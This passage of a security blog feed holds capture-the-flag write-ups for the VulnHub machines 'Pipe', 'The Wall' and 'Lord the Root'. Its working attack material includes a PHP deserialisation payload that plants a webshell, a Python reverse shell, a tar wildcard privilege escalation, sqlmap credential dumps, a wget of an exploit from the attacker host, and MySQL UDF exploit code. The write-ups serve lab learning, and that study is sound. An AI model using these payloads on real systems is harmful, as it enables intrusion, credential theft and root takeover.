<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>The page will load <code>scriptz/php.js</code>, and it serialises some data. Based on the log.php.BAK code,</p>

<p>click link <code>Show Artist Info</code>, get the url, after decoding:</p>

<p><code>O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}</code></p>

<p>The “Info” function looks like a way to read information from a specific file. Recheck the log.php.BAK file, find it use <code>file_put_contents($this-&gt;filename, $this-&gt;data, FILE_APPEND)</code> to write data to a file.</p>

<p>Test if it can write to a Log file</p>

<p><code>param=O:3:"Log":2:{s:8:"filename";s:8:"Test.txt";s:4:"data";s:4:"TEST";}</code></p>

<p>doesn&rsquo;t work</p>

<p><code>param=O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/scriptz/Test.txt";s:4:"data";s:4:"TEST";}</code></p>

<p>works</p>

<p>based on that, build payload:</p>

<p><code>param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" &lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;";}</code></p>

<p>replace the parameter in Burp. forward the traffic</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>then:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>webshell is there.</p>

<p>setup backdoor:</p>

<p><code>http://192.168.41.163/scriptz/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>

<p>get the shell:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>try to find linux kernel local exploit, but I find there is no gcc in the box.</p>

<p>keep looking.</p>

<p>find</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like system does backup automatically. check <code>/etc/crontab</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p><code>/usr/bin/compress.sh</code> can be read</p>

<p>I find the tar uses wild card. Here I will try Tar arbitrary command execution.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>first check which shell is being use in target</p>

<p><code>ls -al /bin/*sh</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>start to create shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="k">echo</span> <span class="o">&gt;</span> <span class="o">--</span><span class="nx">checkpoint</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="k">echo</span> <span class="o">&gt;</span> <span class="o">--</span><span class="nx">checkpoint</span><span class="o">-</span><span class="nx">action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span><span class="nx">sh\</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span><span class="p">;</span>
</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="k">echo</span> <span class="s1">&#39;chmod u+s /bin/dash&#39;</span> <span class="o">&gt;</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span>
</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="k">echo</span> <span class="s1">&#39;touch /home/rene/backup/done&#39;</span> <span class="o">&gt;&gt;</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span>
</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span>
</span><span class='line'><span class="nb">chmod</span> <span class="nx">u</span><span class="o">+</span><span class="nx">s</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">dash</span>
</span><span class='line'><span class="nb">touch</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="o">/</span><span class="nx">done</span>
</span><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">pipe</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">rene</span><span class="o">/</span><span class="nx">backup</span><span class="err">$</span> <span class="nb">chmod</span> <span class="o">+</span><span class="nx">x</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">sh</span>
</span></code></pre></td></tr></table></div></figure>


<p>just wait a few miniutes and a file <code>done</code> will be created</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>run <code>/bin/dash</code> and get the shell</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pipe/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[the wall]]></title>
    <link href="http://wg135.github.io/blog/2016/08/18/the-wall/"/>
    <updated>2016-08-18T14:23:31-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/18/the-wall</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wireshark</li>
<li>Netcat</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Hash-identifier</li>
<li>Hashcat</li>
<li>Steghide</li>
</ul>


<h3>Vulnerabilities:</h3>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.162 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.162 -p-</code></p>

<p>However, no port is opening.</p>

<p>use wireshark to check the traffic</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>find the target send packet to TCP port 1337 in my Kali.</p>

<p><code>nc -nlvp 1337</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>nothing cool shows.</p>

<p>rerun nmap, find port 80 is opening now</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>I use wfuzz and nikto and find nothing.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>The webpage just show a image. check the source code:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting string. <code>737465673d3333313135373330646262623337306663626539373230666536333265633035</code></p>

<p>use Hash-identifier cannot figure out what&rsquo;s encode type. Finally, I find it is hex encode in hackbar. Hex decode to character, get</p>

<p><code>steg=33115730dbbb370fcbe9720fe632ec05</code></p>

<p>use Hash-identifier to find out <code>33115730dbbb370fcbe9720fe632ec05</code> is a MD5</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>use hashcat to crack it.</p>

<p><code>hashcat hash.txt /usr/share/wordlists/rockyou.txt</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>get password is <code>divisionbell</code></p>

<p>Now I want to check the image to see if there is any hiden information</p>

<p><code>steghide extract -p divisionbell -sf pink_floyd.jpg</code></p>

<p>get the result:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p><code>U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0</code> is very interesting. <code>|</code> separates the string into two parts.</p>

<p><code>U3lkQmFycmV0dA==</code> is base64 encoded, decode it, <code>SydBarrett</code></p>

<p><code>f831605ae34c2399d1e5bb3a4ab245d0</code> is MD5. crack it.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>its <code>pinkfloydrocks</code></p>

<p>now what, remember enumerate, enumerate and enumerate.</p>

<p>rerun nmap again,</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>port 1965 is opening and running ssh</p>

<p>login using SydBarrett/pinkfloydrocks.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>shows This service allows sftp connections only</p>

<p>use sftp to login</p>

<p><code>sftp -P 1965 SydBarrett@192.168.41.162</code></p>

<p>check the files</p>

<p><code>sftp&gt; ls -ahl</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>check the file eclipsed_by_the_moon</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p><code>tar zxvf eclipsed_by_the_moon</code></p>

<p><code>foremost -v -i eclipsed_by_the_moon.lsd</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>got a jpg file. <code>Roger Waters</code></p>

<p>open it</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>and his password is <code>hello_is_there_anybody_in_there</code></p>

<p>based on previous username <code>SydBarrett</code>, Roger Waters user name should be <code>RogerWaters</code></p>

<p><code>ssh RogerWaters@192.168.41.162 -p 1965</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>check sticky bit set</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>find / -perm -u=s -type f -user DavidGilmour 2&gt;/dev/null
</span><span class='line'>find / -perm -u=s -type f -user NickMason 2&gt;/dev/null
</span><span class='line'>ls -al /usr/local/bin/shineon 
</span><span class='line'>ls -al /usr/local/bin/brick</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p><code>/usr/local/bin/brick</code> has sticky bit set.</p>

<p>run it</p>

<p><code>/usr/local/bin/brick</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/wall/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Lord the Root]]></title>
    <link href="http://wg135.github.io/blog/2016/08/12/lord-the-root/"/>
    <updated>2016-08-12T13:50:04-05:00</updated>
    <id>http://wg135.github.io/blog/2016/08/12/lord-the-root</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Burpsuite</li>
<li>Sqlmap</li>
</ul>


<h3>Vulnerabilities:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/39166/">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &lsquo;overlayfs&rsquo; Local Root Exploit (1)</a></li>
<li><a href="https://www.exploit-db.com/exploits/1518/">MySQL 4.x/5.0 - User-Defined Function (UDF) Local Privilege Escalation Exploit (Linux)</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
<img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.159 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.159 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 22 is opening.</p>

<p>try to ssh to the box and check the banner</p>

<p><code>ssh root@192.168.41.159</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>find a hint Easy as 1,2,3</p>

<p>looks like port knocking, now try to send packet to port 1, 2 and 3 using <a href="https://github.com/wg135/script/blob/master/port_knocking.py">port knocking</a> script.</p>

<p>run nmap again,</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>port 1337 is openning and it is running http service.</p>

<p>I used both nikto and wfuzz, nothing interesting come out.</p>

<p>check the page</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>check the image info,</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>find an <code>/images/</code>, go to the directory.</p>

<p>nothing cool. check the source code find a <code>/icons/</code>.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>check <code>http://192.168.41.159:1337/robots.txt</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>I check <code>THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh</code> and it is base64 encoded.</p>

<p>Decode it in hackbar, I get:</p>

<p><code>Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</code></p>

<p>This is also base64 encoded.</p>

<p>Decode it again,</p>

<p><code>/978345210/index.php</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>save the post requst in burpsuit as file post.txt</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>username is vulnerable.</p>

<p>get table name</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql --tables</code></p>

<p>webapp database
<img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>mysql
<img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>get columns of webapp</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users --columns</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>dump username and password</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D Webapp -T Users -C username,password --dump</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>get colums of table user</p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user --columns</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p><code>sqlmap -r post.txt -p username --risk=3 --level=5 --dbms=mysql -D mysql -T user -C User,Password --dump</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>try to login web using credential, however, I cannot find anywhere to upload webshell.</p>

<p>I try the credential to login ssh</p>

<p>and <code>smeagol  | MyPreciousR00t</code> works</p>

<h3>Local exploit 1:</h3>

<p><code>uname -a</code></p>

<p>then get:</p>

<p><code>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux</code></p>

<p><code>searchsploit Linux Kernel | grep Ubuntu</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget http://192.168.41.149/39166.c
</span><span class='line'>gcc 39166.c -o local
</span><span class='line'>./local</span></code></pre></td></tr></table></div></figure>


<p>get the root</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<h3>Local exploit 2:</h3>

<p><code>ps aux |grep root</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>mysql is running under the root, which is wrong!</p>

<p>login mysql</p>

<p><code>mysql -u root -p</code>, password is <code>darkshadow</code>, and the mysql version is 5.5.44.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit mysql | grep local</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p>follow the instruction <code>https://www.exploit-db.com/exploits/1518/</code></p>

<p>use the c code:(1518.c)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">enum</span> <span class="n">Item_result</span> <span class="p">{</span><span class="n">STRING_RESULT</span><span class="p">,</span> <span class="n">REAL_RESULT</span><span class="p">,</span> <span class="n">INT_RESULT</span><span class="p">,</span> <span class="n">ROW_RESULT</span><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">st_udf_args</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span>        <span class="n">arg_count</span><span class="p">;</span>  <span class="c1">// number of arguments</span>
</span><span class='line'>    <span class="k">enum</span> <span class="n">Item_result</span>    <span class="o">*</span><span class="n">arg_type</span><span class="p">;</span>  <span class="c1">// pointer to item_result</span>
</span><span class='line'>    <span class="kt">char</span>            <span class="o">**</span><span class="n">args</span><span class="p">;</span>     <span class="c1">// pointer to arguments</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="o">*</span><span class="n">lengths</span><span class="p">;</span>   <span class="c1">// length of string args</span>
</span><span class='line'>    <span class="kt">char</span>            <span class="o">*</span><span class="n">maybe_null</span><span class="p">;</span>    <span class="c1">// 1 for maybe_null args</span>
</span><span class='line'><span class="p">}</span> <span class="n">UDF_ARGS</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">st_udf_init</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span>            <span class="n">maybe_null</span><span class="p">;</span> <span class="c1">// 1 if func can return NULL</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span>        <span class="n">decimals</span><span class="p">;</span>   <span class="c1">// for real functions</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="n">max_length</span><span class="p">;</span> <span class="c1">// for string functions</span>
</span><span class='line'>    <span class="kt">char</span>            <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>       <span class="c1">// free ptr for func data</span>
</span><span class='line'>    <span class="kt">char</span>            <span class="n">const_item</span><span class="p">;</span> <span class="c1">// 0 if result is constant</span>
</span><span class='line'><span class="p">}</span> <span class="n">UDF_INIT</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">do_system</span><span class="p">(</span><span class="n">UDF_INIT</span> <span class="o">*</span><span class="n">initid</span><span class="p">,</span> <span class="n">UDF_ARGS</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">is_null</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">error</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">arg_count</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="nf">do_system_init</span><span class="p">(</span><span class="n">UDF_INIT</span> <span class="o">*</span><span class="n">initid</span><span class="p">,</span> <span class="n">UDF_ARGS</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gcc</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">c</span> <span class="mf">1518.</span><span class="n">c</span>
</span><span class='line'><span class="n">gcc</span> <span class="o">-</span><span class="n">g</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">Wl</span><span class="p">,</span><span class="o">-</span><span class="n">soname</span><span class="p">,</span><span class="mf">1518.</span><span class="n">so</span> <span class="o">-</span><span class="n">o</span> <span class="mf">1518.</span><span class="n">so</span> <span class="mf">1518.</span><span class="n">o</span> <span class="o">-</span><span class="n">lc</span>
</span></code></pre></td></tr></table></div></figure>


<p>in mysql</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">mysql</span>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">create</span> <span class="n">table</span> <span class="n">foo</span><span class="p">(</span><span class="n">line</span> <span class="n">blob</span><span class="p">);</span>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">insert</span> <span class="n">into</span> <span class="n">foo</span> <span class="n">values</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mf">1518.</span><span class="n">so</span><span class="err">&#39;</span><span class="p">));</span>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">foo</span> <span class="n">into</span> <span class="n">dumpfile</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">plugin</span><span class="o">/</span><span class="mf">1518.</span><span class="n">so</span><span class="err">&#39;</span><span class="p">;</span>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">create</span> <span class="n">function</span> <span class="n">do_system</span> <span class="n">returns</span> <span class="n">integer</span> <span class="n">soname</span> <span class="err">&#39;</span><span class="mf">1518.</span><span class="n">so</span><span class="err">&#39;</span><span class="p">;</span>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">func</span><span class="p">;</span>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">select</span> <span class="n">do_system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">id</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">out</span><span class="p">;</span> <span class="n">chown</span> <span class="n">smeagol</span><span class="p">.</span><span class="n">smeagol</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">out</span><span class="err">&#39;</span><span class="p">);</span>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="err">\</span><span class="o">!</span> <span class="n">sh</span>
</span><span class='line'><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">out</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/lordroot/Selection_024.png" title="[title manually exploit [alt text]]" ></p>

<p>exploit is good. now use <a href="https://github.com/wg135/script/blob/master/suid.c">suid.c</a></p>

<p>in mysql:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">select</span> <span class="n">do_system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">suid</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">suid</span><span class="p">.</span><span class="n">c</span><span class="err">&#39;</span><span class="p">);</span>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">select</span> <span class="n">do_system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">suid</span><span class="err">&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>in /tmp</p>

<p><code>./suid</code></p>

